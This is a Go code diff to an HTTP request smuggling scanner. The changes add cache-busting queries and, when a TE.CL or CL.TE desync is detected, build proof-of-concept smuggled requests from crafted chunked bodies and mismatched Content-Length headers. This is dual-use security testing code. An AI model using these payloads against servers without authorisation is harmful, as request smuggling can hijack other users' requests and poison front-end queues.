@@ -12,8 +12,6 @@ import (
 
 	"github.com/rs/zerolog/log"
 
-	"math"
-	"math/rand"
 	"net/http"
 	"net/url"
 	"os"
@@ -77,13 +75,7 @@ func (d *DesyncerImpl) ParseURL(uri string) error {
 
 // builds a new payload
 func (d *DesyncerImpl) NewPl(pl string) *Payload {
-	payload := Payload{HdrPl: pl}
-	payload.ReqLine = ReqLine{
-		Method:  config.Glob.Method,
-		Path:    d.URL.Path,
-		Version: "HTTP/1.1",
-		Query:   fmt.Sprintf("q=%d", rand.Int63n(math.MaxInt64))}
-
+	payload := Payload{HdrPl: pl, URL: d.URL}
 	headers := make(map[string]string)
 	headers["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0"
 	headers["Connection"] = "close"
@@ -154,8 +146,6 @@ func (d *DesyncerImpl) GetCookie() error {
 	return nil
 }
 
-// this could be where multiple tests are done instead of a single one
-// since there are multiple tests avialable for each, this doesn't make since
 func (d *DesyncerImpl) Start() error {
 	if d.runCLTECL() {
 		return nil
@@ -188,7 +178,7 @@ func (d *DesyncerImpl) runCLTECL() bool {
 				log.Info().
 					Str("endpoint", d.URL.String()).
 					Str("status", "success").
-					Msgf("Test stopped on success: PoC payload stored in /result/%s directory", d.URL.Host)
+					Msgf("Test stopped on success: PoC payload stored in /result/%s directory", d.URL.Hostname())
 				return true
 			}
 		}
@@ -197,7 +187,7 @@ func (d *DesyncerImpl) runCLTECL() bool {
 		log.Info().
 			Str("endpoint", d.URL.String()).
 			Str("status", "success").
-			Msgf("finished TECL/CLTE desync tests: PoC payload stored in /result/%s directory", d.URL.Host)
+			Msgf("finished TECL/CLTE desync tests: PoC payload stored in /result/%s directory", d.URL.Hostname())
 	} else {
 		log.Info().
 			Str("endpoint", d.URL.String()).
@@ -209,6 +199,9 @@ func (d *DesyncerImpl) runCLTECL() bool {
 
 func (d *DesyncerImpl) test(p *Payload) (int, error) {
 	t := Transport{}
+	q := d.URL.Query()
+	q.Set("t", fmt.Sprintf("%d", time.Now().Unix())) // avoid caching
+	d.URL.RawQuery = q.Encode()
 	start := time.Now()
 	resp, err := t.RoundTrip(&Request{Url: d.URL, Payload: p, Timeout: config.Glob.Timeout})
 	if err != nil {
@@ -273,7 +266,13 @@ func (d *DesyncerImpl) testTECL(p *Payload) bool {
 			log.Info().
 				Str("endpoint", d.URL.String()).
 				Msgf("Potential TECL issue found - %s@%s://%s%s",
-					(*p).ReqLine.Method, d.URL.Scheme, d.URL.String(), d.URL.Path)
+					config.Glob.Method, d.URL.Scheme, d.URL.String(), d.URL.Path)
+			inner := fmt.Sprintf("GET /404 HTTP/1.1\r\nHost: %s\r\nContent-Length: 50\r\n\r\nX=", d.URL.Hostname())
+			tmp := fmt.Sprintf("1\r\nA\r\n%X\r\n%s\r\n0\r\n\r\n", len(inner), inner)
+			p.Body = tmp
+			p.Cl = len(fmt.Sprintf("1\r\nA\r\n%X\r\n", len(inner)))
+			// d.test(p)
+			// d.test(p)
 			d.GenReport(p, diff)
 			return true // instead return a bool if sth is found
 		}
@@ -315,7 +314,13 @@ func (d *DesyncerImpl) testCLTE(p *Payload) bool {
 				continue
 			}
 			log.Info().Str("endpoint", d.URL.String()).Msgf("Potential CLTE issue found - %s@%s://%s%s",
-				(*p).ReqLine.Method, d.URL.Scheme, d.URL.Host, d.URL.Path)
+				config.Glob.Method, d.URL.Scheme, d.URL.Host, d.URL.Path)
+			inner := fmt.Sprintf("GET /404 HTTP/1.1\r\nHost: %s\r\nContent-Length: 50\r\n\r\n", d.URL.Hostname())
+			tmp := fmt.Sprintf("1\r\nA\r\n0\r\n\r\n%s", inner)
+			p.Body = tmp
+			p.Cl = len(p.Body)
+			// d.test(p) //
+			// d.test(p) // to make sure the queued req proceeds
 			d.GenReport(p, diff)
 			return true
 		}
@@ -328,7 +333,7 @@ func (d *DesyncerImpl) GenReport(p *Payload, t time.Duration) {
 	if err := createDir("/result/"); err != nil {
 		log.Warn().Err(err).Msg("")
 	}
-	if err := createDir(fmt.Sprintf("/result/%s", d.URL.Host)); err != nil {
+	if err := createDir(fmt.Sprintf("/result/%s", d.URL.Hostname())); err != nil {
 		log.Warn().Err(err).Msg("")
 	}
 	pwd, err := os.Getwd()
@@ -336,8 +341,7 @@ func (d *DesyncerImpl) GenReport(p *Payload, t time.Duration) {
 		log.Warn().Err(err).Msg("")
 		return
 	}
-	fname := fmt.Sprintf("%s/result/%s/%s_%s", pwd, d.URL.Host,
-		strings.ReplaceAll(d.URL.Host, ".", "_"), p.ReqLine.Query)
+	fname := fmt.Sprintf("%s/result/%s/%ss", pwd, d.URL.Hostname(), d.URL.Query().Get("t"))
 	file, err := os.OpenFile(fname, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
 	if err != nil {
 		log.Warn().Err(err).Msg("")
